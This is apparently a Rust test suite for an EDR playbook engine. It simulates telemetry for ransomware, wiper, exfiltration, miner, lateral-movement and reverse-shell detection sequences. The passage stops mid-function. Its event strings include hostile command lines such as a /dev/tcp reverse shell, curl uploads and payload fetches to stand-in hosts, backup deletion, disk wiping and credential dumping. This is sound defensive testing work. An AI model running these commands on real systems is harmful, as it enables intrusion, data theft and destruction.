// Tests for the playbook path: decoder-shaped outputs go through the real adapter
// (router, /proc enrichment with a stand-in reader), the real mapper and the real engine
// loaded from the shipped playbooks/ directory.
//
// Each output below has the category, signal and data keys its decoder writes:
//   proc_lifecycle exec   ebpf_ingest.rs decode_proc_lifecycle
//   wx_exec memfd_exec    ebpf_ingest.rs decode_wx
//   file_access_monitor   ebpf_ingest.rs decode_file
//   raw_syscalls_catcher  ebpf_bridge.rs edr_event_to_output (376-byte struct edr_event)
//   tcp_state             the same 376-byte frame, evt_type 200
//   net_flow              ebpf_ingest.rs decode_net
//   host_perf, auth_log   modules/host_perf.rs, modules/auth_log.rs
//   edr_guard             guard::guard_finding

use std::collections::HashMap;
use std::path::Path;

use super::*;
use crate::pb_adapter::{adapter_facts_with, clock, ProcInfo};
use crate::telemetry_types::TelemetryOutput;

const O_RDONLY: i64 = 0;
const O_WRONLY: i64 = 0o1;
const O_RDWR: i64 = 0o2;
const O_CREAT_: i64 = 0o100;
const O_TRUNC_: i64 = 0o1000;

struct Sim {
    eng: PlaybookEngine,
    mapper: Mapper,
    /// Unix seconds.
    t: u64,
    /// What /proc would show for each pid.
    procs: HashMap<i64, ProcInfo>,
    hits: Vec<EngineHit>,
    /// uid on raw syscall frames. Playbooks with context_keys [host, user] join only
    /// the steps of one user.
    raw_uid: u32,
}

fn out(category: &str, signal: &str, data: &[(&str, String)]) -> TelemetryOutput {
    TelemetryOutput {
        category: category.into(),
        signal: signal.into(),
        confidence: 0.95,
        data: data.iter().map(|(k, v)| (k.to_string(), v.clone())).collect(),
    }
}

impl Sim {
    fn new() -> Self {
        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("playbooks");
        let (eng, report) = PlaybookEngine::load_dir_report(&dir).unwrap();
        assert_eq!(report.loaded.len(), 29, "skipped: {:?}", report.skipped);
        let mounts = FixedMounts(vec![
            ("/".into(), "ext4".into()),
            ("/mnt/nfs".into(), "nfs4".into()),
            ("/mnt/local".into(), "ext4".into()),
        ]);
        Self {
            eng,
            mapper: Mapper::with_mounts(Box::new(mounts)),
            t: 1_800_000_000,
            procs: HashMap::new(),
            hits: Vec::new(),
            raw_uid: 1000,
        }
    }

    fn feed(&mut self, o: TelemetryOutput) {
        let Sim {
            eng,
            mapper,
            t,
            procs,
            hits,
            ..
        } = self;
        let read = |pid: i64| procs.get(&pid).cloned().unwrap_or_default();
        for af in adapter_facts_with(&o, *t, &read) {
            for f in mapper.facts(&af) {
                hits.extend(eng.ingest_fact(f));
            }
        }
    }

    fn advance(&mut self, secs: u64) {
        self.t += secs;
        self.eng.tick(self.t);
    }

    fn count(&self, id: &str) -> usize {
        self.hits.iter().filter(|h| h.playbook_id == id).count()
    }

    fn fired(&self) -> Vec<String> {
        self.hits.iter().map(|h| h.playbook_id.clone()).collect()
    }

    fn cooldown(&self, id: &str) -> u64 {
        self.eng.playbooks[id].cooldown_sec
    }

    fn ts_ns(&self) -> String {
        clock::unix_secs_to_mono_ns(self.t).to_string()
    }

    /// sched_process_exec from proc_lifecycle. /proc shows the new image and argv.
    fn exec(&mut self, pid: i64, ppid: i64, uid: u32, exe: &str, cmd: &str) {
        self.exec_env(pid, ppid, uid, exe, cmd, &[]);
    }

    /// An exec whose allowlisted environment holds `env`.
    fn exec_env(&mut self, pid: i64, ppid: i64, uid: u32, exe: &str, cmd: &str, env: &[(&str, &str)]) {
        self.procs.insert(
            pid,
            ProcInfo {
                exe: Some(exe.into()),
                cmdline: Some(cmd.into()),
                cwd: Some("/root".into()),
                env: env.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
            },
        );
        let comm: String = exe.rsplit('/').next().unwrap_or("").chars().take(15).collect();
        let o = out(
            "process",
            "process::exec",
            &[
                ("pid", pid.to_string()),
                ("ppid", ppid.to_string()),
                ("uid", uid.to_string()),
                ("comm", comm),
                ("ts_ns", self.ts_ns()),
                ("evt_type", "1001".into()),
                ("source", "proc_lifecycle".into()),
            ],
        );
        self.feed(o);
    }

    /// wx_exec kind 2: a process wrote to a memfd and then exec'd.
    fn memfd_exec(&mut self, pid: i64, exe: &str, cmd: &str) {
        self.procs.insert(
            pid,
            ProcInfo {
                exe: Some(exe.into()),
                cmdline: Some(cmd.into()),
                cwd: Some("/tmp".into()),
                env: Vec::new(),
            },
        );
        let o = out(
            "memory",
            "memory::memfd_exec",
            &[
                ("pid", pid.to_string()),
                ("kind", "2".into()),
                ("ts_ns", self.ts_ns()),
                ("source", "wx_exec".into()),
                ("memfd_bytes", "68432".into()),
            ],
        );
        self.feed(o);
    }

    /// file_access_monitor: sys_enter_openat, no flags and no stamp.
    fn perf_open(&mut self, pid: i64, uid: u32, comm: &str, path: &str) {
        let o = out(
            "file",
            "file_access",
            &[
                ("pid", pid.to_string()),
                ("uid", uid.to_string()),
                ("comm", comm.into()),
                ("path", path.into()),
                ("source", "file_access_monitor".into()),
            ],
        );
        self.feed(o);
    }

    /// One 376-byte struct edr_event as edr_event_to_output writes it.
    fn raw(&mut self, signal: &str, evt: i64, sys: i64, pid: i64, fd: i64, ret: i64, flags: i64, aux64: u64, path: &str, path2: &str) {
        let mut data = vec![
            ("ts_ns", self.ts_ns()),
            ("timestamp", self.t.to_string()),
            ("tgid", pid.to_string()),
            ("ppid", "1".to_string()),
            ("uid", self.raw_uid.to_string()),
            ("fd", fd.to_string()),
            ("ret", ret.to_string()),
            ("evt_type", evt.to_string()),
            ("syscall_id", sys.to_string()),
            ("flags", flags.to_string()),
            ("aux_u32", "0".to_string()),
            ("aux_u64", aux64.to_string()),
            ("comm", "worker".to_string()),
        ];
        if !path.is_empty() {
            data.push(("path", path.to_string()));
        }
        if !path2.is_empty() {
            data.push(("path2", path2.to_string()));
        }
        let o = out("file", signal, &data);
        self.feed(o);
    }

    /// openat exit: ret is the fd, or -errno.
    fn sys_open(&mut self, pid: i64, path: &str, flags: i64, ret: i64) {
        let fd = if ret >= 0 { ret } else { -1 };
        self.raw("file_open", 10, 56, pid, fd, ret, flags, 0, path, "");
    }
    fn sys_rename(&mut self, pid: i64, old: &str, new: &str) {
        self.raw("file_rename", 11, 276, pid, -1, 0, 0, 0, old, new);
    }
    /// renameat (38 on arm64), what glibc rename() uses. Same frame, other syscall id.
    fn sys_renameat(&mut self, pid: i64, old: &str, new: &str) {
        self.raw("file_rename", 11, 38, pid, -1, 0, 0, 0, old, new);
    }

    /// proc_lifecycle exec of a process that exited before /proc was read. /proc has
    /// nothing for the pid, so only the filename and argv the kernel copied are left.
    fn exec_gone(&mut self, pid: i64, ppid: i64, filename: &str, argv: &str) {
        self.procs.remove(&pid);
        let comm: String = filename.rsplit('/').next().unwrap_or("").chars().take(15).collect();
        let o = out(
            "process",
            "process::exec",
            &[
                ("pid", pid.to_string()),
                ("ppid", ppid.to_string()),
                ("uid", "0".into()),
                ("comm", comm),
                ("ts_ns", self.ts_ns()),
                ("evt_type", "1001".into()),
                ("source", "proc_lifecycle".into()),
                ("exec_filename", filename.into()),
                ("exec_argv", argv.into()),
            ],
        );
        self.feed(o);
    }
    fn sys_unlink(&mut self, pid: i64, path: &str) {
        self.raw("file_unlink", 14, 35, pid, -1, 0, 0, 0, path, "");
    }
    fn sys_write(&mut self, pid: i64, fd: i64, count: u64) {
        self.raw("fd_write", 13, 64, pid, fd, 0, 0, count, "", "");
    }
    fn sys_close(&mut self, pid: i64, fd: i64) {
        self.raw("fd_close", 18, 57, pid, fd, 0, 0, 0, "", "");
    }

    /// net_flow sys_enter_connect.
    fn connect(&mut self, pid: i64, ip: &str, port: u16) {
        let o = out(
            "network",
            "network::connect",
            &[
                ("pid", pid.to_string()),
                ("kind", "1".into()),
                ("source", "net_flow".into()),
                ("family", "2".into()),
                ("is_v6", "0".into()),
                ("dst_addr", ip.into()),
                ("dst_port", port.to_string()),
            ],
        );
        self.feed(o);
    }

    /// A ClientHello the sensor copied from the first write on a socket to 443, decoded.
    fn tls_hello(&mut self, pid: i64, ip: &str, port: u16, sni: &str) {
        let o = out(
            "network",
            "network::tls_client_hello",
            &[
                ("pid", pid.to_string()),
                ("kind", "4".into()),
                ("source", "net_flow".into()),
                ("family", "2".into()),
                ("dst_addr", ip.into()),
                ("dst_port", port.to_string()),
                ("sni", sni.into()),
                ("alpn", "h2,http/1.1".into()),
            ],
        );
        self.feed(o);
    }

    /// net_flow sys_exit of send, sendto or sendmsg.
    fn send(&mut self, pid: i64, bytes: u64) {
        let o = out(
            "network",
            "network::tx_bytes",
            &[
                ("pid", pid.to_string()),
                ("kind", "2".into()),
                ("source", "net_flow".into()),
                ("bytes", bytes.to_string()),
            ],
        );
        self.feed(o);
    }

    /// tcp_state kprobe on tcp_set_state: one state change of a socket.
    fn tcp(&mut self, tgid: i64, old: u32, new: u32, l: (&str, u16), r: (&str, u16)) {
        let mut data = vec![
            ("ts_ns", self.ts_ns()),
            ("timestamp", self.t.to_string()),
            ("tgid", tgid.to_string()),
            ("ppid", "1".to_string()),
            ("uid", "0".to_string()),
            ("fd", "-1".to_string()),
            ("ret", "0".to_string()),
            ("evt_type", "200".to_string()),
            ("syscall_id", "0".to_string()),
            ("flags", "0".to_string()),
            ("aux_u32", ((old << 16) | new).to_string()),
            ("aux_u64", "0".to_string()),
            ("comm", "bash".to_string()),
            ("fam", "2".to_string()),
            ("proto", "6".to_string()),
            ("laddr4", l.0.to_string()),
            ("raddr4", r.0.to_string()),
            ("rport", r.1.to_string()),
        ];
        if l.1 != 0 {
            data.push(("lport", l.1.to_string()));
        }
        let o = out("network", "tcp_state", &data);
        self.feed(o);
    }

    /// One host_perf sample for a busy process.
    fn perf(&mut self, pid: i64, exe: &str, cpu: f64) {
        let o = out(
            "perf",
            "host_perf::sample",
            &[
                ("source", "host_perf".into()),
                ("scope", "process".into()),
                ("pid", pid.to_string()),
                ("cpu_pct", format!("{cpu:.1}")),
                ("binary_path", exe.into()),
            ],
        );
        self.feed(o);
    }

    /// One sshd line from auth_log. src_new is what the reader works out.
    fn auth(&mut self, result: &str, user: &str, ip: &str, new: bool) {
        let scope = ip_scope(ip);
        let o = out(
            "auth",
            if result == "success" { "auth::ssh_login" } else { "auth::ssh_failure" },
            &[
                ("source", "auth_log".into()),
                ("method", "ssh".into()),
                ("result", result.into()),
                ("auth_kind", "password".into()),
                ("user", user.into()),
                ("src_ip", ip.into()),
                ("src_port", "50122".into()),
                ("src_scope", scope.into()),
                ("src_private", (scope != "public").to_string()),
                ("src_new", new.to_string()),
                ("timestamp", self.t.to_string()),
            ],
        );
        self.feed(o);
    }

    /// One guard decision, in the shape guard::guard_finding writes.
    fn guard(&mut self, guard: &str, action: &str, mitre: &str, pid: i64, exe: &str) {
        let o = out(
            "process",
            &format!("guard::{guard}::{action}"),
            &[
                ("source", "edr_guard".into()),
                ("timestamp", self.t.to_string()),
                ("pid", pid.to_string()),
                ("uid", "0".into()),
                ("comm", "kill".into()),
                ("binary_path", exe.into()),
                ("guard", guard.into()),
                ("action", action.into()),
                ("target", "pid 1234".into()),
                ("mitre", mitre.into()),
            ],
        );
        self.feed(o);
    }
}

// ---- The 13 playbooks that loaded before: a sequence that fires, and a near miss ----

const BREAKOUT: &str = "pb_container_breakout_precursors_linux";
fn breakout(s: &mut Sim) {
    s.exec(4100, 4000, 0, "/usr/bin/unshare", "unshare --mount --uts --ipc --fork /bin/sh");
    s.advance(20);
    s.perf_open(4101, 0, "head", "/proc/kallsyms");
}
fn breakout_miss(s: &mut Sim) {
    // The host touch comes 480 s later, after the 420 s TTL of the namespace step.
    s.exec(4100, 4000, 0, "/usr/bin/unshare", "unshare --mount --uts --ipc --fork /bin/sh");
    s.advance(480);
    s.perf_open(4101, 0, "head", "/proc/kallsyms");
}

const ATTR: &str = "pb_outage_ransomware_linux_attr_locker";
fn attr_chattr(s: &mut Sim) {
    for i in 0..200 {
        let cmd = format!("chattr +i /home/u/f{i} /srv/d/f{i} /opt/a/f{i}");
        s.exec(5000 + i, 4999, 0, "/usr/bin/chattr", &cmd);
        if i % 10 == 9 {
            s.advance(1);
        }
    }
}
fn attr(s: &mut Sim) {
    attr_chattr(s);
    for i in 0..300 {
        s.sys_open(6000 + i % 5, &format!("/home/u/f{}", i % 200), O_RDWR, -13);
    }
}
fn attr_miss(s: &mut Sim) {
    // The opens fail with ENOENT, not EACCES or EPERM: no access-failure spike.
    attr_chattr(s);
    for i in 0..300 {
        s.sys_open(6000 + i % 5, &format!("/home/u/g{i}"), O_RDONLY, -2);
    }
}

const BACKUP: &str = "pb_outage_ransomware_linux_backup_wipe_first";
fn backup_burst(s: &mut Sim) {
    for i in 0..400 {
        let p = format!("/srv/data/f{i}.db");
        s.sys_rename(7100, &p, &format!("{p}.locked"));
    }
}
fn backup(s: &mut Sim) {
    // root wipes the backups, then root's encryptor renames.
    s.raw_uid = 0;
    s.exec(7000, 6999, 0, "/usr/bin/rm", "rm -rf /backup/daily");
    s.advance(60);
    backup_burst(s);
}
fn backup_miss(s: &mut Sim) {
    // The backup wipe is 2500 s before the burst, past its 2400 s TTL.
    s.raw_uid = 0;
    s.exec(7000, 6999, 0, "/usr/bin/rm", "rm -rf /backup/daily");
    s.advance(2500);
    backup_burst(s);
}

const HOSTPATH: &str = "pb_outage_ransomware_linux_container_hostpath";
fn hostpath_burst(s: &mut Sim) {
    for i in 0..500 {
        let p = format!("/var/lib/docker/volumes/webdata/_data/f{i}");
        s.sys_open(7300, &p, O_WRONLY | O_TRUNC_, 3 + i % 100);
    }
}
fn hostpath(s: &mut Sim) {
    s.raw_uid = 0;
    s.exec(7200, 7199, 0, "/usr/bin/docker", "docker exec -it web sh");
    s.advance(30);
    hostpath_burst(s);
}
fn hostpath_miss(s: &mut Sim) {
    // The same volume burst with no container tool run first.
    hostpath_burst(s);
}

const DB: &str = "pb_outage_ransomware_linux_db_impact";
fn db_churn(s: &mut Sim) {
    for i in 0..400 {
        s.sys_unlink(7500, &format!("/var/lib/mysql/shop/t{i}.ibd"));
    }
}
fn db(s: &mut Sim) {
    s.exec(7400, 7399, 0, "/usr/bin/mariadb", "mariadb shop -e DROP TABLE accounts");
    s.advance(10);
    db_churn(s);
}
fn db_miss(s: &mut Sim) {
    // A client runs, but no destructive SQL.
    s.exec(7400, 7399, 0, "/usr/bin/mariadb", "mariadb shop -e SELECT 1");
    s.advance(10);
    db_churn(s);
}

const FILEBURST: &str = "pb_outage_ransomware_linux_fileburst_crypto";
fn fileburst_renames(s: &mut Sim) {
    for i in 0..510 {
        let dir = ["/home/alice/docs", "/srv/share", "/opt/app/data"][i % 3];
        let p = format!("{dir}/f{i}.txt");
        s.sys_rename(7600, &p, &format!("{p}.enc"));
    }
}
fn openssl(s: &mut Sim) {
    openssl_as(s, 1000);
}
fn openssl_as(s: &mut Sim, uid: u32) {
    s.exec(
        7601,
        7600,
        uid,
        "/usr/bin/openssl",
        "openssl enc -aes-256-cbc -pbkdf2 -in /home/alice/docs/f0.txt -out /home/alice/docs/f0.txt.enc",
    );
}
fn fileburst(s: &mut Sim) {
    fileburst_renames(s);
    s.advance(5);
    openssl(s);
}
fn fileburst_miss(s: &mut Sim) {
    // The crypto tool runs 700 s after the burst, past the burst's 600 s TTL.
    fileburst_renames(s);
    s.advance(700);
    openssl(s);
}

const FUSE: &str = "pb_outage_ransomware_linux_fuse_overlay";
fn fuse_burst(s: &mut Sim) {
    for i in 0..500 {
        let p = format!("/mnt/overlay/data/f{i}");
        s.sys_open(7701, &p, O_WRONLY | O_CREAT_ | O_TRUNC_, 5);
    }
}
fn fuse(s: &mut Sim) {
    s.exec(7700, 7699, 1000, "/usr/bin/fusermount", "fusermount -o rw /mnt/overlay");
    s.advance(15);
    fuse_burst(s);
}
fn fuse_miss(s: &mut Sim) {
    // The burst starts 700 s after the mount, past the mount step's 600 s TTL.
    s.exec(7700, 7699, 1000, "/usr/bin/fusermount", "fusermount -o rw /mnt/overlay");
    s.advance(700);
    fuse_burst(s);
}

const INTERMIT: &str = "pb_outage_ransomware_linux_intermit_encrypt";
fn intermit_files(s: &mut Sim, rename: bool) {
    for i in 0..800 {
        let p = format!("/home/bob/photos/img{i}.jpg");
        s.sys_open(7800, &p, O_RDWR, 7);
        s.sys_write(7800, 7, 4096);
        s.sys_write(7800, 7, 4096);
        s.sys_close(7800, 7);
        if rename {
            s.sys_rename(7800, &p, &format!("{p}.lock"));
        }
        if i % 100 == 99 {
            s.advance(10);
        }
    }
}
fn intermit(s: &mut Sim) {
    intermit_files(s, true);
}
fn intermit_miss(s: &mut Sim) {
    // The same short writes in place, with no renames.
    intermit_files(s, false);
}

const LUKS: &str = "pb_outage_ransomware_linux_luks_locker";
fn luks(s: &mut Sim) {
    s.exec(7900, 7899, 0, "/usr/sbin/cryptsetup", "cryptsetup luksFormat --batch-mode /dev/vdb");
    s.advance(120);
    s.exec(7901, 7899, 0, "/usr/bin/dash", "/bin/sh /usr/sbin/update-initramfs -u");
}
fn luks_miss(s: &mut Sim) {
    // The boot-chain change comes 1900 s later, past the 1800 s TTL of the locker step.
    s.exec(7900, 7899, 0, "/usr/sbin/cryptsetup", "cryptsetup luksFormat --batch-mode /dev/vdb");
    s.advance(1900);
    s.exec(7901, 7899, 0, "/usr/bin/dash", "/bin/sh /usr/sbin/update-initramfs -u");
}

const MEMFD: &str = "pb_outage_ransomware_linux_memfd_inplace";
fn memfd_burst(s: &mut Sim, rename: bool) {
    for i in 0..600 {
        let dir = ["/home/carol", "/srv/www", "/opt/data"][i % 3];
        let p = format!("{dir}/f{i}.dat");
        s.sys_open(8000, &p, O_RDWR, 9);
        if rename {
            s.sys_rename(8000, &p, &format!("{p}.x"));
        }
    }
}
fn memfd(s: &mut Sim) {
    s.memfd_exec(8000, "/memfd:payload (deleted)", "payload --run");
    s.advance(5);
    memfd_burst(s, false);
}
fn memfd_miss(s: &mut Sim) {
    // The in-place burst with no memfd or RWX exec.
    memfd_burst(s, false);
}

const NETSHARE: &str = "pb_outage_ransomware_linux_netshare_only";
fn share_burst(s: &mut Sim, root: &str) {
    for i in 0..400 {
        s.sys_open(8100, &format!("{root}/projects/f{i}.docx"), O_WRONLY | O_TRUNC_, 4);
    }
}
fn netshare(s: &mut Sim) {
    share_burst(s, "/mnt/nfs");
}
fn netshare_miss(s: &mut Sim) {
    // The same burst on a local ext4 mount.
    share_burst(s, "/mnt/local");
}

const VM: &str = "pb_outage_ransomware_linux_vm_image_datastore";
fn vm_images(s: &mut Sim, writes: usize, mib: u64) {
    for i in 0..20 {
        let p = format!("/var/lib/libvirt/images/vm{i}.qcow2");
        s.sys_open(8200, &p, O_RDWR, 11);
        for _ in 0..writes {
            s.sys_write(8200, 11, mib * 1024 * 1024);
        }
        s.sys_close(8200, 11);
        s.advance(10);
    }
}
fn vm(s: &mut Sim) {
    // 20 images, 600 MiB each, 11.7 GiB in all.
    vm_images(s, 2, 300);
}
fn vm_miss(s: &mut Sim) {
    // 20 images but 5 GiB in all, under the 10 GiB bar.
    vm_images(s, 1, 256);
}

const WIPER: &str = "pb_outage_wiper_linux_service_kill";
fn wiper(s: &mut Sim) {
    s.exec(8300, 8299, 0, "/usr/bin/systemctl", "systemctl stop postgresql");
    s.advance(30);
    // Ubuntu 25.10 and later ship the Rust coreutils, where /usr/bin/dd is a link to
    // /usr/lib/cargo/bin/coreutils/dd, the path /proc shows.
    s.exec(8301, 8299, 0, "/usr/lib/cargo/bin/coreutils/dd", "dd if=/dev/zero of=/dev/vdb bs=1M");
}
fn wiper_miss(s: &mut Sim) {
    // dd runs, but on files, not a device.
    s.exec(8300, 8299, 0, "/usr/bin/systemctl", "systemctl stop postgresql");
    s.advance(30);
    s.exec(8301, 8299, 0, "/usr/bin/dd", "dd if=/tmp/a of=/tmp/b bs=1M");
}

// ---- The 16 ported playbooks ----

const COMPRESS: &str = "pb_compress_then_exfil_linux";
fn compress_with(s: &mut Sim, ip: &str) {
    s.exec(9100, 9099, 1000, "/usr/bin/tar", "tar -czf /tmp/stage.tgz /home/a/docs");
    s.advance(30);
    s.exec(9101, 9099, 1000, "/usr/bin/curl", "curl -T /tmp/stage.tgz https://up.example/u");
    s.connect(9101, ip, 443);
}
fn compress(s: &mut Sim) {
    compress_with(s, "203.0.113.5");
}
fn compress_miss(s: &mut Sim) {
    // The upload goes to a private address.
    compress_with(s, "10.0.0.5");
}

const CLOUD_EXFIL: &str = "pb_cloud_cli_exfil_linux_aws_rclone";
fn cloud_upload(s: &mut Sim, pid: i64, exe: &str, cmd: &str, chunks: u64, mb: u64) {
    cloud_upload_to(s, pid, exe, cmd, chunks, mb, "bucket-x.s3.amazonaws.com");
}
fn cloud_upload_to(s: &mut Sim, pid: i64, exe: &str, cmd: &str, chunks: u64, mb: u64, sni: &str) {
    s.exec(pid, 9199, 1000, exe, cmd);
    s.connect(pid, "203.0.113.10", 443);
    s.tls_hello(pid, "203.0.113.10", 443, sni);
    for _ in 0..chunks {
        s.send(pid, mb * 1_000_000);
        s.advance(1);
    }
}
fn cloud_exfil(s: &mut Sim) {
    cloud_upload(s, 9200, "/usr/local/bin/aws", "aws s3 sync /srv/data s3://bucket-x", 6, 100);
}
fn cloud_exfil_miss(s: &mut Sim) {
    // 300 MB, under the 500 MB bar.
    cloud_upload(s, 9200, "/usr/local/bin/aws", "aws s3 sync /srv/data s3://bucket-x", 3, 100);
}

const MINER: &str = "pb_crypto_miner_linux_pool_cpu_gpu";
fn miner_start(s: &mut Sim) {
    s.exec(9300, 9299, 1000, "/tmp/.x/xmrig", "xmrig -o stratum+tcp://203.0.113.10:3333 --algo rx/0");
    s.connect(9300, "203.0.113.10", 3333);
}
fn miner(s: &mut Sim) {
    miner_start(s);
    // 62 samples 5 s apart at a full core: 305 s without a break.
    for _ in 0..62 {
        s.advance(5);
        s.perf(9300, "/tmp/.x/xmrig", 99.0);
    }
}
fn gpu(s: &mut Sim, pct: f64) {
    let o = out(
        "perf",
        "host_perf::sample",
        &[
            ("source", "host_perf".into()),
            ("scope", "gpu".into()),
            ("gpu", "card0".into()),
            ("gpu_util_pct", format!("{pct:.1}")),
        ],
    );
    s.feed(o);
}
fn miner_miss(s: &mut Sim) {
    // The same 310 s of samples with a 40 s gap in the middle: no run reaches 300 s.
    miner_start(s);
    for i in 0..62 {
        s.advance(if i == 31 { 40 } else { 5 });
        s.perf(9300, "/tmp/.x/xmrig", 99.0);
    }
}

const ENCRYPTOR: &str = "pb_encryptor_linux_memfd_rwx_lowrename";
fn encryptor(s: &mut Sim) {
    s.memfd_exec(9400, "/memfd:enc (deleted)", "enc");
    s.advance(5);
    memfd_burst(s, false);
}
fn encryptor_miss(s: &mut Sim) {
    // Every file is also renamed, so the rename ratio is 1.0, not low.
    s.memfd_exec(9400, "/memfd:enc (deleted)", "enc");
    s.advance(5);
    memfd_burst(s, true);
}

const STAGING: &str = "pb_exfil_linux_staging_tmpfs_ssh";
fn staging_steps(s: &mut Sim) {
    for i in 0..25 {
        s.perf_open(9500, 0, "cat", &format!("/etc/kubernetes/pki/k{i}.key"));
    }
    s.advance(10);
    s.exec(9501, 9499, 0, "/usr/bin/tar", "tar -czf /dev/shm/stage.tgz /etc/kubernetes");
    s.advance(10);
}
/// A peer address that changes between runs, so a replay inside one test is a new peer.
fn staging_peer(s: &Sim) -> String {
    format!("203.0.113.{}", 11 + (s.t / 1000) % 200)
}
fn staging_upload(s: &mut Sim, peer: &str) {
    s.exec(9502, 9499, 0, "/usr/bin/scp", &format!("scp /dev/shm/stage.tgz x@{peer}:/tmp/"));
    s.connect(9502, peer, 22);
    s.send(9502, 60_000_000);
    s.send(9502, 60_000_000);
}
fn staging(s: &mut Sim) {
    let peer = staging_peer(s);
    staging_steps(s);
    staging_upload(s, &peer);
}
fn staging_miss(s: &mut Sim) {
    // The host talked to the peer before, so the upload is not to a new peer.
    let peer = staging_peer(s);
    s.connect(9400, &peer, 22);
    staging_steps(s);
    staging_upload(s, &peer);
}

const LATERAL: &str = "pb_lateral_linux_ssh_portforward_pivot";
fn lateral_with(s: &mut Sim, ip: &str) {
    s.auth("success", "alice", ip, true);
    s.advance(20);
    s.exec(9600, 9599, 1000, "/usr/bin/ssh", "ssh -fN -L 8080:10.0.0.5:80 jump");
}
fn lateral(s: &mut Sim) {
    lateral_with(s, "203.0.113.7");
}
fn lateral_miss(s: &mut Sim) {
    // The login came from a private address.
    lateral_with(s, "10.1.2.3");
}

const LOTL_CRED: &str = "pb_lotl_cred_linux";
fn lotl_cred(s: &mut Sim) {
    s.exec(9700, 9699, 0, "/usr/local/bin/mimipenguin", "mimipenguin");
    s.perf_open(9700, 0, "mimipenguin", "/etc/shadow");
}
fn lotl_cred_miss(s: &mut Sim) {
    // passwd reads /etc/shadow, with no dumping tool around.
    s.exec(9710, 9699, 0, "/usr/bin/passwd", "passwd alice");
    s.perf_open(9710, 0, "passwd", "/etc/shadow");
}

const LOTL_CURL: &str = "pb_lotl_linux_curl_devshm_systemdrun_memfd";
fn lotl_curl_steps(s: &mut Sim, curl_parent: i64) {
    s.exec(9800, curl_parent, 0, "/usr/bin/curl", "curl -s http://203.0.113.10:8000/p -o /dev/shm/p1");
    for i in 0..6 {
        s.sys_open(9800, &format!("/dev/shm/p{i}"), O_WRONLY | O_CREAT_, 3);
    }
    s.advance(20);
    s.exec(9802, 9799, 0, "/usr/bin/systemd-run", "systemd-run --unit=shm-job /dev/shm/p1");
}
fn lotl_curl(s: &mut Sim) {
    lotl_curl_steps(s, 9799);
}
fn lotl_curl_miss(s: &mut Sim) {
    // The fetch ran inside a CI job (CI=true in its environment): the forbidden slot
    // vetoes the chain.
    s.exec_env(9790, 1, 0, "/usr/bin/curl", "curl -s http://203.0.113.10:8000/p -o /dev/shm/p0", &[("CI", "true")]);
    lotl_curl_steps(s, 9799);
}

const MEMFD_EGRESS: &str = "pb_memfd_child_egress_linux";
fn memfd_egress_with(s: &mut Sim, connector: i64) {
    s.memfd_exec(9900, "/memfd:x (deleted)", "x");
    s.advance(2);
    s.exec(9901, 9900, 0, "/usr/bin/curl", "curl http://203.0.113.10/");
    s.advance(1);
    s.connect(connector, "203.0.113.10", 80);
}
fn memfd_egress(s: &mut Sim) {
    memfd_egress_with(s, 9901);
}
fn memfd_egress_miss(s: &mut Sim) {
    // The connection comes from an unrelated process.
    memfd_egress_with(s, 9950);
}

const TAMPER: &str = "pb_outage_edr_tamper_disable";
fn tamper_with(s: &mut Sim, guard: &str, mitre: &str) {
    s.exec(10000, 9999, 0, "/usr/bin/systemctl", "systemctl stop elastic-agent");
    s.advance(5);
    s.guard(guard, "blocked", mitre, 10001, "/usr/bin/kill");
}
fn tamper(s: &mut Sim) {
    tamper_with(s, "self_protect", "T1562.001");
}
fn tamper_miss(s: &mut Sim) {
    // The guard decision is a container socket block (T1611), not tampering.
    tamper_with(s, "runtime_socket", "T1611,T1610");
}

const DDOS: &str = "pb_outage_internal_ddos_egress";
fn ddos_flood(s: &mut Sim, per_sec: usize, secs: usize) {
    s.exec(10100, 10099, 0, "/usr/bin/python3", "python3 flood.py");
    for _ in 0..secs {
        for _ in 0..per_sec {
            s.connect(10100, "203.0.113.10", 80);
        }
        s.advance(1);
    }
}
fn ddos(s: &mut Sim) {
    ddos_flood(s, 2500, 1);
}
fn ddos_miss(s: &mut Sim) {
    // The same 2500 connects spread over 5 s: 500 a second.
    ddos_flood(s, 500, 5);
}

const CLOUD_STORE: &str = "pb_outage_ransomware_linux_cloud_store";
fn cloud_store(s: &mut Sim) {
    cloud_upload(s, 10200, "/usr/bin/rclone", "rclone sync --delete-after /srv/data remote:bucket", 3, 80);
}
fn cloud_store_miss(s: &mut Sim) {
    // A listing with no destructive verb, then the same upload.
    cloud_upload(s, 10200, "/usr/bin/rclone", "rclone lsd remote:", 3, 80);
}

const EXFIL_ENC: &str = "pb_outage_ransomware_linux_exfil_then_encrypt";
fn exfil_enc_with(s: &mut Sim, second_dst: &str) {
    s.exec(10300, 10299, 1000, "/usr/bin/rclone", "rclone copy /srv remote:b");
    s.connect(10300, "203.0.113.10", 443);
    for _ in 0..11 {
        s.send(10300, 100_000_000);
    }
    s.connect(10300, second_dst, 443);
    for _ in 0..11 {
        s.send(10300, 100_000_000);
    }
    s.advance(600);
    for i in 0..400 {
        s.sys_open(10301, &format!("/srv/data/f{i}.db"), O_WRONLY | O_TRUNC_, 4);
    }
}
fn exfil_enc(s: &mut Sim) {
    exfil_enc_with(s, "203.0.113.12");
}
fn exfil_enc_miss(s: &mut Sim) {
    // 2.2 GB, all of it to one destination.
    exfil_enc_with(s, "203.0.113.10");
}

const SSH_CREDS: &str = "pb_ssh_valid_creds_pivot_linux";
fn ssh_creds_with(s: &mut Sim, new: bool) {
    s.auth("success", "alice", "198.51.100.20", new);
    s.advance(30);
    s.exec(10401, 10400, 1000, "/usr/bin/scp", "scp /etc/hosts alice@10.0.0.9:/tmp/");
}
fn ssh_creds(s: &mut Sim) {
    ssh_creds_with(s, true);
}
fn ssh_creds_miss(s: &mut Sim) {
    // The address logged in successfully before.
    ssh_creds_with(s, false);
}

const TERMINAL: &str = "pb_terminal_exec_core";
fn terminal_with(s: &mut Sim, parent: &str) {
    s.exec(10500, 10499, 1000, parent, "parent");
    s.exec(10501, 10500, 1000, "/usr/bin/curl", "curl -s https://example.org");
}
fn terminal(s: &mut Sim) {
    terminal_with(s, "/usr/bin/bash");
}
fn terminal_miss(s: &mut Sim) {
    // curl started by a python program, not a shell.
    terminal_with(s, "/usr/bin/python3");
}

const WEBSHELL: &str = "pb_webshell_reverse_shell_linux";
fn webshell_with(s: &mut Sim, parent: &str) {
    s.exec(10600, 1, 33, parent, "worker");
    s.exec(10601, 10600, 33, "/usr/bin/bash", "bash -c exec 3<>/dev/tcp/203.0.113.10/4444");
    // SYN_SENT in the shell's context, then ESTABLISHED in another task's context.
